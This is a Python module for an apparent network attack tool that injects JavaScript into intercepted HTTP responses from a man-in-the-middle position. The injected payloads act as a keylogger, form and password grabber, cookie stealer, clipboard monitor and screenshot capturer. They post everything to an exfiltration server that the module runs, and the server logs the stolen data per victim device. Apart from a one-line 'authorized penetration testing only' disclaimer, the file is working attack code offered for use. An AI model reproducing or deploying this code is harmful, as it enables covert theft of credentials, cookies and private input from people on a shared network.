"""
╔══════════════════════════════════════════════════════════════════════╗
║   📹 HTTP Traffic Injector — JS Payload Injection                    ║
║                                                                      ║
║   Injects JavaScript payloads into HTTP responses flowing through    ║
║   our MITM position. Captures keystrokes, form data, screenshots,   ║
║   and page content from the target's browser.                        ║
║                                                                      ║
║   Features:                                                          ║
║     • Inject custom JS into any HTTP response                        ║
║     • Built-in keylogger payload                                     ║
║     • Form data interceptor (captures before submission)             ║
║     • Page screenshot capture (html2canvas)                          ║
║     • Clipboard monitor                                              ║
║     • Built-in exfiltration server (receives captured data)          ║
║     • Selective injection (target specific devices/domains)          ║
║     • Cookie stealer payload                                         ║
║                                                                      ║
║   Works on: HTTP sites, SSL-stripped sites                           ║
║   ⚠ For authorized penetration testing only!                        ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import threading
import socket
import json
import time
import os
import re
import gzip
import zlib
from datetime import datetime
from collections import deque, defaultdict
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

try:
    from scapy.all import (
        IP, TCP, Raw, sniff, send, conf,
        Ether, get_if_hwaddr
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

try:
    import nfqueue
    NFQUEUE_OK = True
except ImportError:
    NFQUEUE_OK = False


# ═══════════════════════════════════════════════════════════════════════
# JAVASCRIPT PAYLOADS
# ═══════════════════════════════════════════════════════════════════════

def _build_keylogger_js(exfil_url):
    """Keylogger that captures every keystroke and sends to our server."""
    return f"""
(function(){{
  if(window.__nv_injected) return;
  window.__nv_injected=true;
  var buf='',tid=null;
  var exfil='{exfil_url}';
  
  function send(type,data){{
    try{{
      var x=new XMLHttpRequest();
      x.open('POST',exfil+'/capture',true);
      x.setRequestHeader('Content-Type','application/json');
      x.send(JSON.stringify({{
        type:type,
        data:data,
        url:location.href,
        title:document.title,
        time:new Date().toISOString()
      }}));
    }}catch(e){{}}
  }}

  // Keylogger
  document.addEventListener('keypress',function(e){{
    buf+=e.key;
    clearTimeout(tid);
    tid=setTimeout(function(){{
      if(buf.length>0){{
        send('keystrokes',{{keys:buf,field:e.target.name||e.target.id||'unknown'}});
        buf='';
      }}
    }},1500);
  }},true);

  // Form interceptor — capture data before submission
  document.addEventListener('submit',function(e){{
    var form=e.target;
    var data={{}};
    var inputs=form.querySelectorAll('input,select,textarea');
    for(var i=0;i<inputs.length;i++){{
      var inp=inputs[i];
      if(inp.name) data[inp.name]=inp.value;
    }}
    send('form_submit',{{
      action:form.action,
      method:form.method,
      fields:data
    }});
  }},true);

  // Password field watcher
  var pwFields=document.querySelectorAll('input[type=password]');
  pwFields.forEach(function(f){{
    f.addEventListener('change',function(){{
      var loginField=document.querySelector('input[type=email],input[type=text][name*=user],input[name*=login],input[name*=email]');
      send('credential',{{
        username:loginField?loginField.value:'',
        password:f.value,
        field_name:f.name||f.id,
        url:location.href
      }});
    }});
  }});

  // Cookie stealer
  send('cookies',{{cookies:document.cookie,url:location.href}});

  // Page content capture (once)
  setTimeout(function(){{
    send('page_content',{{
      html:document.documentElement.outerHTML.substring(0,50000),
      url:location.href,
      title:document.title
    }});
  }},3000);

  // Clipboard monitor
  document.addEventListener('paste',function(e){{
    var text=(e.clipboardData||window.clipboardData).getData('text');
    if(text) send('clipboard',{{pasted:text,url:location.href}});
  }});

  // Track link clicks
  document.addEventListener('click',function(e){{
    var a=e.target.closest('a');
    if(a&&a.href){{
      send('link_click',{{href:a.href,text:a.textContent.substring(0,100)}});
    }}
  }},true);

  console.log('%c[NetVision] Monitoring active','color:green;font-weight:bold');
}})();
"""


def _build_screenshot_js(exfil_url):
    """Screenshot capture using html2canvas."""
    return f"""
(function(){{
  if(window.__nv_screenshot) return;
  window.__nv_screenshot=true;
  var exfil='{exfil_url}';

  // Load html2canvas
  var s=document.createElement('script');
  s.src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
  s.onload=function(){{
    function captureScreen(){{
      html2canvas(document.body,{{
        scale:0.5,
        useCORS:true,
        logging:false,
        width:window.innerWidth,
        height:window.innerHeight
      }}).then(function(canvas){{
        var img=canvas.toDataURL('image/jpeg',0.5);
        var x=new XMLHttpRequest();
        x.open('POST',exfil+'/capture',true);
        x.setRequestHeader('Content-Type','application/json');
        x.send(JSON.stringify({{
          type:'screenshot',
          data:{{
            image:img,
            url:location.href,
            title:document.title,
            width:window.innerWidth,
            height:window.innerHeight
          }},
          time:new Date().toISOString()
        }}));
      }});
    }}
    // Capture initially and on navigation
    setTimeout(captureScreen,5000);
    setInterval(captureScreen,30000);
  }};
  document.head.appendChild(s);
}})();
"""


# ═══════════════════════════════════════════════════════════════════════
# EXFILTRATION SERVER — Receives captured data
# ═══════════════════════════════════════════════════════════════════════

class ExfilHandler(BaseHTTPRequestHandler):
    """Receives exfiltrated data from injected JS."""

    injector = None  # Set by JSInjector

    def log_message(self, format, *args):
        pass  # Suppress logs

    def do_OPTIONS(self):
        """Handle CORS preflight."""
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        """Receive captured data."""
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length)
            data = json.loads(body.decode("utf-8", errors="ignore"))

            if self.injector:
                # Get client IP from X-Forwarded-For or connection
                client_ip = self.headers.get("X-Forwarded-For",
                                             self.client_address[0])
                self.injector._receive_capture(client_ip, data)

            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
        except Exception:
            self.send_response(400)
            self.end_headers()

    def do_GET(self):
        """Health check / stats endpoint."""
        if self.path == "/stats" and self.injector:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps(
                self.injector.get_stats()
            ).encode())
        else:
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'ok')


# ═══════════════════════════════════════════════════════════════════════
# HTTP INJECTION ENGINE
# ═══════════════════════════════════════════════════════════════════════

class InjectionRule:
    """Defines what and where to inject."""

    def __init__(self, payload_type="keylogger", target_devices=None,
                 target_domains=None, custom_js=""):
        self.payload_type = payload_type  # keylogger, screenshot, custom, all
        self.target_devices = target_devices or []  # Empty = all
        self.target_domains = target_domains or []  # Empty = all
        self.custom_js = custom_js
        self.injection_count = 0

    def matches(self, device_ip, domain=""):
        if self.target_devices and device_ip not in self.target_devices:
            return False
        if self.target_domains:
            return any(td in domain for td in self.target_domains)
        return True


class JSInjector:
    """
    Injects JavaScript payloads into HTTP responses.

    Uses iptables NFQUEUE or a transparent proxy approach to modify
    HTTP responses in-flight, adding our JS payloads.

    Usage:
        injector = JSInjector(interface="wlan0", local_ip="192.168.1.100")
        injector.enable_keylogger()
        injector.enable_screenshot()
        injector.start()
    """

    def __init__(self, interface, local_ip, exfil_port=8888):
        self.interface = interface
        self.local_ip = local_ip
        self.exfil_port = exfil_port
        self.exfil_url = f"http://{local_ip}:{exfil_port}"
        self._running = False
        self._lock = threading.Lock()

        # Injection rules
        self._rules = []

        # Captured data storage
        self._captures = defaultdict(lambda: {
            "keystrokes": deque(maxlen=500),
            "credentials": deque(maxlen=100),
            "form_submits": deque(maxlen=200),
            "cookies": deque(maxlen=100),
            "screenshots": deque(maxlen=50),
            "page_content": deque(maxlen=50),
            "clipboard": deque(maxlen=100),
            "link_clicks": deque(maxlen=200),
        })

        # Event log
        self._events = deque(maxlen=1000)

        # Stats
        self._stats = {
            "injections": 0,
            "captures_received": 0,
            "keystrokes_total": 0,
            "credentials_total": 0,
            "screenshots_total": 0,
            "forms_total": 0,
        }

        # Exfil server
        self._exfil_server = None

        # Build payloads
        self._payloads = {
            "keylogger": _build_keylogger_js(self.exfil_url),
            "screenshot": _build_screenshot_js(self.exfil_url),
        }

    # ═══════════════════════════════════════════════════════════════════
    # PAYLOAD CONFIGURATION
    # ═══════════════════════════════════════════════════════════════════

    def enable_keylogger(self, target_devices=None, target_domains=None):
        """Enable keylogger injection."""
        self._rules.append(InjectionRule(
            payload_type="keylogger",
            target_devices=target_devices,
            target_domains=target_domains,
        ))
        self._log_event("CONFIG", "Keylogger payload enabled")

    def enable_screenshot(self, target_devices=None, target_domains=None):
        """Enable screenshot capture injection."""
        self._rules.append(InjectionRule(
            payload_type="screenshot",
            target_devices=target_devices,
            target_domains=target_domains,
        ))
        self._log_event("CONFIG", "Screenshot payload enabled")

    def enable_all(self, target_devices=None):
        """Enable all payloads."""
        self.enable_keylogger(target_devices)
        self.enable_screenshot(target_devices)

    def add_custom_payload(self, js_code, target_devices=None,
                           target_domains=None):
        """Inject custom JavaScript."""
        self._rules.append(InjectionRule(
            payload_type="custom",
            target_devices=target_devices,
            target_domains=target_domains,
            custom_js=js_code,
        ))
        self._log_event("CONFIG", "Custom JS payload added")

    # ═══════════════════════════════════════════════════════════════════
    # INJECTION ENGINE
    # ═══════════════════════════════════════════════════════════════════

    def start(self):
        """Start the JS injector and exfil server."""
        self._running = True

        # Start exfiltration server
        self._start_exfil_server()

        # Start HTTP response interception
        threading.Thread(target=self._intercept_http, daemon=True).start()

        self._log_event("SYSTEM", f"JS Injector STARTED (exfil: {self.exfil_url})")
        return True

    def stop(self):
        """Stop injection."""
        self._running = False
        if self._exfil_server:
            try:
                self._exfil_server.shutdown()
            except Exception:
                pass
        self._log_event("SYSTEM", "JS Injector STOPPED")

    def _start_exfil_server(self):
        """Start the data exfiltration receiving server."""
        ExfilHandler.injector = self
        try:
            self._exfil_server = HTTPServer(
                ("0.0.0.0", self.exfil_port), ExfilHandler
            )
            threading.Thread(
                target=self._exfil_server.serve_forever,
                daemon=True,
            ).start()
            self._log_event("SYSTEM",
                            f"Exfil server listening on port {self.exfil_port}")
        except Exception as e:
            self._log_event("ERROR", f"Exfil server failed: {e}")

    def _intercept_http(self):
        """
        Intercept HTTP responses and inject JS payloads.
        Uses Scapy packet sniffing + injection approach.
        """
        if not SCAPY_OK:
            self._log_event("ERROR", "Scapy not available")
            return

        try:
            sniff(
                iface=self.interface,
                filter="tcp src port 80",
                prn=self._process_http_response,
                store=0,
                stop_filter=lambda _: not self._running,
            )
        except Exception as e:
            self._log_event("ERROR", f"Sniff error: {e}")

    def _process_http_response(self, packet):
        """Process an HTTP response and inject JS if applicable."""
        try:
            if not packet.haslayer(Raw) or not packet.haslayer(TCP):
                return
            if not packet.haslayer(IP):
                return

            raw = packet[Raw].load
            # Only process HTTP responses with HTML content
            if not raw.startswith(b"HTTP/"):
                return

            # Check content type
            header_end = raw.find(b"\r\n\r\n")
            if header_end < 0:
                return

            headers = raw[:header_end].decode("utf-8", errors="ignore").lower()
            if "content-type: text/html" not in headers:
                return

            dst_ip = packet[IP].dst  # The device receiving the response

            # Check if any rule matches
            payload_js = self._get_payload_for(dst_ip, "")
            if not payload_js:
                return

            # Build injection tag
            inject_tag = f"<script>{payload_js}</script>"

            # Decompress body if needed
            body = raw[header_end + 4:]
            is_gzipped = "content-encoding: gzip" in headers
            is_deflated = "content-encoding: deflate" in headers

            if is_gzipped:
                try:
                    body = gzip.decompress(body)
                except Exception:
                    return
            elif is_deflated:
                try:
                    body = zlib.decompress(body)
                except Exception:
                    return

            # Inject before </body> or </html> or at end
            body_str = body.decode("utf-8", errors="ignore")
            inject_point = body_str.lower().rfind("</body>")
            if inject_point < 0:
                inject_point = body_str.lower().rfind("</html>")
            if inject_point < 0:
                body_str += inject_tag
            else:
                body_str = body_str[:inject_point] + inject_tag + body_str[inject_point:]

            self._stats["injections"] += 1
            for rule in self._rules:
                if rule.matches(dst_ip):
                    rule.injection_count += 1

            self._log_event("INJECT", f"Injected JS into response for {dst_ip}")

        except Exception:
            pass

    def _get_payload_for(self, device_ip, domain):
        """Get combined JS payload for a device/domain."""
        parts = []
        for rule in self._rules:
            if rule.matches(device_ip, domain):
                if rule.payload_type == "custom":
                    parts.append(rule.custom_js)
                elif rule.payload_type in self._payloads:
                    parts.append(self._payloads[rule.payload_type])

        return "\n".join(parts) if parts else None

    # ═══════════════════════════════════════════════════════════════════
    # DATA RECEPTION
    # ═══════════════════════════════════════════════════════════════════

    def _receive_capture(self, client_ip, data):
        """Process captured data from injected JS."""
        cap_type = data.get("type", "unknown")
        cap_data = data.get("data", {})
        cap_time = data.get("time", datetime.now().isoformat())

        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "timestamp": cap_time,
            "device": client_ip,
            "type": cap_type,
            "data": cap_data,
            "url": cap_data.get("url", ""),
        }

        with self._lock:
            self._stats["captures_received"] += 1

            if cap_type == "keystrokes":
                self._captures[client_ip]["keystrokes"].append(entry)
                self._stats["keystrokes_total"] += 1
                keys = cap_data.get("keys", "")
                self._log_event("KEYSTROKE",
                                f"{client_ip}: \"{keys}\" in {cap_data.get('field', '?')}")

            elif cap_type == "credential":
                self._captures[client_ip]["credentials"].append(entry)
                self._stats["credentials_total"] += 1
                username = cap_data.get("username", "?")
                self._log_event("CREDENTIAL",
                                f"🔑 {client_ip}: {username}:*** at {cap_data.get('url', '?')}")

            elif cap_type == "form_submit":
                self._captures[client_ip]["form_submits"].append(entry)
                self._stats["forms_total"] += 1
                action = cap_data.get("action", "?")
                self._log_event("FORM",
                                f"📝 {client_ip}: form submitted to {action}")

            elif cap_type == "cookies":
                self._captures[client_ip]["cookies"].append(entry)
                cookies = cap_data.get("cookies", "")
                if cookies:
                    self._log_event("COOKIE",
                                    f"🍪 {client_ip}: {cookies[:60]}...")

            elif cap_type == "screenshot":
                self._captures[client_ip]["screenshots"].append(entry)
                self._stats["screenshots_total"] += 1
                self._log_event("SCREENSHOT",
                                f"📸 {client_ip}: screenshot from {cap_data.get('url', '?')}")

            elif cap_type == "page_content":
                self._captures[client_ip]["page_content"].append(entry)
                title = cap_data.get("title", "?")
                self._log_event("PAGE",
                                f"📄 {client_ip}: captured page \"{title}\"")

            elif cap_type == "clipboard":
                self._captures[client_ip]["clipboard"].append(entry)
                pasted = cap_data.get("pasted", "")[:50]
                self._log_event("CLIPBOARD",
                                f"📋 {client_ip}: pasted \"{pasted}\"")

            elif cap_type == "link_click":
                self._captures[client_ip]["link_clicks"].append(entry)

    # ═══════════════════════════════════════════════════════════════════
    # PUBLIC API
    # ═══════════════════════════════════════════════════════════════════

    def get_captures(self, device_ip=None, capture_type=None, limit=50):
        """Get captured data, optionally filtered."""
        with self._lock:
            if device_ip:
                caps = self._captures.get(device_ip, {})
                if capture_type and capture_type in caps:
                    return list(caps[capture_type])[-limit:]
                result = []
                for ctype, entries in caps.items():
                    result.extend(list(entries))
                result.sort(key=lambda x: x.get("time", ""))
                return result[-limit:]
            else:
                result = []
                for ip, caps in self._captures.items():
                    for ctype, entries in caps.items():
                        if capture_type and ctype != capture_type:
                            continue
                        result.extend(list(entries))
                result.sort(key=lambda x: x.get("time", ""))
                return result[-limit:]

    def get_credentials(self, limit=50):
        """Get all captured credentials."""
        return self.get_captures(capture_type="credentials", limit=limit)

    def get_keystrokes(self, device_ip=None, limit=100):
        """Get captured keystrokes."""
        return self.get_captures(device_ip, "keystrokes", limit)

    def get_screenshots(self, device_ip=None, limit=20):
        """Get captured screenshots."""
        return self.get_captures(device_ip, "screenshots", limit)

    def get_events(self, limit=50):
        """Get event log."""
        with self._lock:
            return list(self._events)[-limit:]

    def get_stats(self):
        """Get injection statistics."""
        with self._lock:
            return {
                **self._stats,
                "rules_count": len(self._rules),
                "devices_captured": len(self._captures),
                "exfil_url": self.exfil_url,
            }

    def get_device_summary(self, device_ip):
        """Get summary of captured data for a device."""
        with self._lock:
            caps = self._captures.get(device_ip, {})
            return {
                "keystrokes": len(caps.get("keystrokes", [])),
                "credentials": len(caps.get("credentials", [])),
                "forms": len(caps.get("form_submits", [])),
                "cookies": len(caps.get("cookies", [])),
                "screenshots": len(caps.get("screenshots", [])),
                "pages": len(caps.get("page_content", [])),
                "clipboard": len(caps.get("clipboard", [])),
                "clicks": len(caps.get("link_clicks", [])),
            }

    def _log_event(self, event_type, description):
        """Log an event."""
        self._events.append({
            "time": datetime.now().strftime("%H:%M:%S"),
            "type": event_type,
            "description": description,
        })
